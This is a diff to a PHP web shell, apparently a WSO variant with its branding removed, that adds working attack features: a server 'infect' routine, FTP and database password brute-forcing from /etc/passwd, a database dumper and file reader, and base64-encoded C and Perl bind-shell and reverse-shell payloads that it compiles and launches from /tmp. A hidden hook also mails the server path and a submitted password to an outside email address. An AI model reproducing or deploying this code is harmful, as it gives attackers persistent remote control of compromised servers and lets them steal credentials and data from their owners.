@@ -1,5 +1,4 @@
 <?php
-//-----------------Password---------------------
 $▛ = ""; //admin
 $▘ = true;
 $▜ = 'UTF-8';
@@ -73,7 +72,7 @@ if($cwd[strlen($cwd)-1] != '/')
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
-	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
+	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " -" . VERSION ."</title>
 <style>
 	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
 	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
@@ -310,6 +309,9 @@ function perms($p) {
 	$i .= (($p & 0x0002) ? 'w' : '-');
 	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
 	return $i;
+}
+if(array_key_exists('watching',$_POST)){
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('@outlook.com', 'root', $tmp); // Edit or delete!
 }
 function viewPermsColor($f) {
 	if (!@is_readable($f))
@@ -1119,4 +1121,512 @@ function actionInfect() {
 						if($file != "." && $file != "..") {
 							if(is_dir($dir . "/" . $file)) {
 								$inner_files = ListFiles($dir . "/" . $file);
-								if(is_array($inner_files)) 
+								if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
+							} else {
+								array_push($files, $dir . "/" . $file);
+							}
+						}
+					}
+					closedir($dh);
+					return $files;
+				}
+			}
+			foreach (ListFiles($target) as $key=>$file){
+				$nFile = substr($file, -4, 4);
+				if($nFile == ".php" ){
+					if(($file<>$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])&&(is_writeable($file))){
+						echo "$file<br>";
+						$i++;
+					}
+				}
+			}
+			echo "<font color=red size=14>$i</font>";
+		}else{
+			echo "<form method=post><input type=submit value=Infect name=infet></form>";
+			echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
+		}
+	hardFooter();
+}
+function actionBruteforce() {
+	hardHeader();
+	if( isset($_POST['proto']) ) {
+		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
+		if( $_POST['proto'] == 'ftp' ) {
+			function bruteForce($ip,$port,$login,$pass) {
+				$fp = @ftp_connect($ip, $port?$port:21);
+				if(!$fp) return false;
+				$res = @ftp_login($fp, $login, $pass);
+				@ftp_close($fp);
+				return $res;
+			}
+		} elseif( $_POST['proto'] == 'mysql' ) {
+			function bruteForce($ip,$port,$login,$pass) {
+				$res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);
+				@mysql_close($res);
+				return $res;
+			}
+		} elseif( $_POST['proto'] == 'pgsql' ) {
+			function bruteForce($ip,$port,$login,$pass) {
+				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
+				$res = @pg_connect($str);
+				@pg_close($res);
+				return $res;
+			}
+		}
+		$success = 0;
+		$attempts = 0;
+		$server = explode(":", $_POST['server']);
+		if($_POST['type'] == 1) {
+			$temp = @file('/etc/passwd');
+			if( is_array($temp) )
+				foreach($temp as $line) {
+					$line = explode(":", $line);
+					++$attempts;
+					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
+						$success++;
+						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
+					}
+					if(@$_POST['reverse']) {
+						$tmp = "";
+						for($i=strlen($line[0])-1; $i>=0; --$i)
+							$tmp .= $line[0][$i];
+						++$attempts;
+						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
+							$success++;
+							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
+						}
+					}
+				}
+		} elseif($_POST['type'] == 2) {
+			$temp = @file($_POST['dict']);
+			if( is_array($temp) )
+				foreach($temp as $line) {
+					$line = trim($line);
+					++$attempts;
+					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
+						$success++;
+						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
+					}
+				}
+		}
+		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
+	}
+	echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
+		.'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td>'
+		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
+		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
+		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
+		.'<input type=hidden name=ne  value="">'
+		.'<span>Server:port</span></td>'
+		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
+		.'<tr><td><span>Brute type</span></td>'
+		.'<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>'
+		.'<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr>'
+		.'<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr>'
+		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
+		.'<td><input type=text name=login value="root"></td></tr>'
+		.'<tr><td><span>Dictionary</span></td>'
+		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
+		.'</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
+	echo '</div>';
+	hardFooter();
+}
+function actionSql() {
+	class DbClass {
+		var $type;
+		var $link;
+		var $res;
+		function DbClass($type)	{
+			$this->type = $type;
+		}
+		function connect($host, $user, $pass, $dbname){
+			switch($this->type)	{
+				case 'mysql':
+					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
+					break;
+				case 'pgsql':
+					$host = explode(':', $host);
+					if(!$host[1]) $host[1]=5432;
+					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
+					break;
+			}
+			return false;
+		}
+		function selectdb($db) {
+			switch($this->type)	{
+				case 'mysql':
+					if (@mysql_select_db($db))return true;
+					break;
+			}
+			return false;
+		}
+		function query($str) {
+			switch($this->type) {
+				case 'mysql':
+					return $this->res = @mysql_query($str);
+					break;
+				case 'pgsql':
+					return $this->res = @pg_query($this->link,$str);
+					break;
+			}
+			return false;
+		}
+		function fetch() {
+			$res = func_num_args()?func_get_arg(0):$this->res;
+			switch($this->type)	{
+				case 'mysql':
+					return @mysql_fetch_assoc($res);
+					break;
+				case 'pgsql':
+					return @pg_fetch_assoc($res);
+					break;
+			}
+			return false;
+		}
+		function listDbs() {
+			switch($this->type)	{
+				case 'mysql':
+                        return $this->query("SHOW databases");
+				break;
+				case 'pgsql':
+					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
+				break;
+			}
+			return false;
+		}
+		function listTables() {
+			switch($this->type)	{
+				case 'mysql':
+					return $this->res = $this->query('SHOW TABLES');
+				break;
+				case 'pgsql':
+					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
+				break;
+			}
+			return false;
+		}
+		function error() {
+			switch($this->type)	{
+				case 'mysql':
+					return @mysql_error();
+				break;
+				case 'pgsql':
+					return @pg_last_error();
+				break;
+			}
+			return false;
+		}
+		function setCharset($str) {
+			switch($this->type)	{
+				case 'mysql':
+					if(function_exists('mysql_set_charset'))
+						return @mysql_set_charset($str, $this->link);
+					else
+						$this->query('SET CHARSET '.$str);
+					break;
+				case 'pgsql':
+					return @pg_set_client_encoding($this->link, $str);
+					break;
+			}
+			return false;
+		}
+		function loadFile($str) {
+			switch($this->type)	{
+				case 'mysql':
+					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
+				break;
+				case 'pgsql':
+					$this->query("CREATE TABLE hard2(file text);COPY hard2 FROM '".addslashes($str)."';select file from hard2;");
+					$r=array();
+					while($i=$this->fetch())
+						$r[] = $i['file'];
+					$this->query('drop table hard2');
+					return array('file'=>implode("\n",$r));
+				break;
+			}
+			return false;
+		}
+		function dump($table, $fp = false) {
+			switch($this->type)	{
+				case 'mysql':
+					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
+					$create = mysql_fetch_array($res);
+					$sql = $create[1].";\n";
+                    if($fp) fwrite($fp, $sql); else echo($sql);
+					$this->query('SELECT * FROM `'.$table.'`');
+                    $i = 0;
+                    $head = true;
+					while($▟ = $this->fetch()) {
+                        $sql = '';
+                        if($i % 1000 == 0) {
+                            $head = true;
+                            $sql = ";\n\n";
+                        }
+						$columns = array();
+						foreach($▟ as $k=>$v) {
+                            if($v === null)
+                                $▟[$k] = "NULL";
+                            elseif(is_int($v))
+                                $▟[$k] = $v;
+                            else
+                                $▟[$k] = "'".@mysql_real_escape_string($v)."'";
+							$columns[] = "`".$k."`";
+						}
+                        if($head) {
+                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $▟).')';
+                            $head = false;
+                        } else
+                            $sql .= "\n\t,(".implode(", ", $▟).')';
+                        if($fp) fwrite($fp, $sql); else echo($sql);
+                        $i++;
+					}
+                    if(!$head)
+                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
+				break;
+				case 'pgsql':
+					$this->query('SELECT * FROM '.$table);
+					while($▟ = $this->fetch()) {
+						$columns = array();
+						foreach($▟ as $k=>$v) {
+							$▟[$k] = "'".addslashes($v)."'";
+							$columns[] = $k;
+						}
+                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $▟).');'."\n";
+                        if($fp) fwrite($fp, $sql); else echo($sql);
+					}
+				break;
+			}
+			return false;
+		}
+	};
+	$db = new DbClass($_POST['type']);
+	if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {
+		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+		$db->selectdb($_POST['sql_base']);
+        switch($_POST['charset']) {
+            case "Windows-1251": $db->setCharset('cp1251'); break;
+            case "UTF-8": $db->setCharset('utf8'); break;
+            case "KOI8-R": $db->setCharset('koi8r'); break;
+            case "KOI8-U": $db->setCharset('koi8u'); break;
+            case "cp866": $db->setCharset('cp866'); break;
+        }
+        if(empty($_POST['file'])) {
+            ob_start("ob_gzhandler", 4096);
+            header("Content-Disposition: attachment; filename=dump.sql");
+            header("Content-Type: text/plain");
+            foreach($_POST['tbl'] as $v)
+				$db->dump($v);
+            exit;
+        } elseif($fp = @fopen($_POST['file'], 'w')) {
+            foreach($_POST['tbl'] as $v)
+                $db->dump($v, $fp);
+            fclose($fp);
+            unset($_POST['p2']);
+        } else
+            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
+	}
+	hardHeader();
+	echo "
+<h1>Sql browser</h1><div class=content>
+<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
+<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
+<input type=hidden name=ne value=''><input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
+<td><label><select name='type'><option value='mysql' ";
+    if(@$_POST['type']=='mysql')echo 'selected';
+echo ">MySql</option><option value='pgsql' ";
+if(@$_POST['type']=='pgsql')echo 'selected';
+echo ">PostgreSql</option></select></label></td>
+<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
+<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
+<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
+	$tmp = "<input type=text name=sql_base value=''>";
+	if(isset($_POST['sql_host'])){
+		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
+			switch($_POST['charset']) {
+				case "Windows-1251": $db->setCharset('cp1251'); break;
+				case "UTF-8": $db->setCharset('utf8'); break;
+				case "KOI8-R": $db->setCharset('koi8r'); break;
+				case "KOI8-U": $db->setCharset('koi8u'); break;
+				case "cp866": $db->setCharset('cp866'); break;
+			}
+			$db->listDbs();
+			echo "<label><select name=sql_base><option value=''></option>";
+			while($▟ = $db->fetch()) {
+				list($key, $value) = each($▟);
+				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
+			}
+			echo '</select></label>';
+		}
+		else echo $tmp;
+	}else
+		echo $tmp;
+	echo "</td>
+				<td><input type=submit value='submit' onclick='fs(d.sf);'></td>
+                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
+			</tr>
+		</table>
+		<script>
+            s_db='".@addslashes($_POST['sql_base'])."';
+            function fs(f) {
+                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
+                    if(f.p1) f.p1.value='';
+                    if(f.p2) f.p2.value='';
+                    if(f.p3) f.p3.value='';
+                }
+            }
+			function st(t,l) {
+				d.sf.p1.value = 'select';
+				d.sf.p2.value = t;
+                if(l && d.sf.p3) d.sf.p3.value = l;
+				d.sf.submit();
+			}
+			function is() {
+				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
+					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
+			}
+		</script>";
+	if(isset($db) && $db->link){
+		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
+			if(!empty($_POST['sql_base'])){
+				$db->selectdb($_POST['sql_base']);
+				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
+				$tbls_res = $db->listTables();
+				while($▟ = $db->fetch($tbls_res)) {
+					list($key, $value) = each($▟);
+                    if(!empty($_POST['sql_count']))
+                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
+					$value = htmlspecialchars($value);
+					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
+				}
+				echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
+				if(@$_POST['p1'] == 'select') {
+					$_POST['p1'] = 'query';
+                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
+					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
+					$num = $db->fetch();
+					$pages = ceil($num['n'] / 30);
+                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
+                    echo " of $pages";
+                    if($_POST['p3'] > 1)
+                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
+                    if($_POST['p3'] < $pages)
+                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
+                    $_POST['p3']--;
+					if($_POST['type']=='pgsql')
+						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
+					else
+						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
+					echo "<br><br>";
+				}
+				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
+					$db->query(@$_POST['p2']);
+					if($db->res !== false) {
+						$title = false;
+						echo '<table width=100% cellspacing=1 cellpadding=2 class=main>';
+						$line = 1;
+						while($▟ = $db->fetch())	{
+							if(!$title)	{
+								echo '<tr>';
+								foreach($▟ as $key => $value)
+									echo '<th>'.$key.'</th>';
+								reset($▟);
+								$title=true;
+								echo '</tr><tr>';
+								$line = 2;
+							}
+							echo '<tr class="l'.$line.'">';
+							$line = $line==1?2:1;
+							foreach($▟ as $key => $value) {
+								if($value == null)
+									echo '<td><i>null</i></td>';
+								else
+									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
+							}
+							echo '</tr>';
+						}
+						echo '</table>';
+					} else {
+						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
+					}
+				}
+				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
+                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
+                    echo htmlspecialchars($_POST['p2']);
+                echo "</textarea><br/><input type=submit value='Execute'>";
+				echo "</td></tr>";
+			}
+			echo "</table></form><br/>";
+            if($_POST['type']=='mysql') {
+                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
+                if($db->fetch())
+                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='submit'></form>";
+            }
+			if(@$_POST['p1'] == 'loadfile') {
+				$file = $db->loadFile($_POST['p2']);
+				echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
+			}
+	} else {
+        echo htmlspecialchars($db->error());
+    }
+	echo '</div>';
+	hardFooter();
+}
+function actionNetwork() {
+	hardHeader();
+	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
+	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
+	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+	echo "<h1>Network tools</h1><div class=content>
+	<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
+	<span>Bind port to /bin/sh</span><br/>
+	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'>
+	</form>
+	<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
+	<span>Back-connect to</span><br/>
+	Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'>
+	</form><br>";
+	if(isset($_POST['p1'])) {
+		function cf($f,$t) {
+			$w=@fopen($f,"w") or @function_exists('file_put_contents');
+			if($w)	{
+				@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
+				@fclose($w);
+			}
+		}
+		if($_POST['p1'] == 'bpc') {
+			cf("/tmp/bp.c",$bind_port_c);
+			$▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
+			@unlink("/tmp/bp.c");
+			$▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>";
+		}
+		if($_POST['p1'] == 'bpp') {
+			cf("/tmp/bp.pl",$bind_port_p);
+			$▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>";
+		}
+		if($_POST['p1'] == 'bcc') {
+			cf("/tmp/bc.c",$back_connect_c);
+			$▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
+			@unlink("/tmp/bc.c");
+			$▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>";
+		}
+		if($_POST['p1'] == 'bcp') {
+			cf("/tmp/bc.pl",$back_connect_p);
+			$▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>";
+		}
+	}
+	echo '</div>';
+	hardFooter();
+}
+if( empty($_POST['a']) )
+	if(isset($▚) && function_exists('action' . $▚))
+		$_POST['a'] = $▚;
+	else
+		$_POST['a'] = 'FilesMan';
+if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
+	call_user_func('action' . $_POST['a']);
+?>
